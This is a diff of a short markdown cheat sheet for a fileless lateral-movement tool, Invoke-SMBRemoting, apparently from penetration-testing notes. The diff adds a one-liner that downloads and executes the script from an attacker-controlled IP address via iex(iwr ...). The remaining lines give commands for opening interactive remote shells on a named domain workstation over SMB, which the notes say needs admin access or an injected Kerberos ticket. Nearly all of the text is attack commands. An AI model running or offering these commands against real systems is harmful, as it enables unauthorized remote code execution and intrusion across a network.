@@ -1,7 +1,8 @@
 # FileLess Lateral Movement - Powershell Implementation
 *NOTE: We need admin access to SMB on the victim, can be abused using also injected kerberos ticket!*
-### Cheetsheet:
+- Invoke the script: `iex(iwr http://192.168.45.223/Invoke-SMBRemoting -UseBasicParsing)`
 
+### Cheetsheet:
 <ins>Interactive Shell</ins>
   - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local"`
   - `Invoke-SMBRemoting -ComputerName "Workstation-01.ferrari.local" -PipeName Something -ServiceName RandomService`
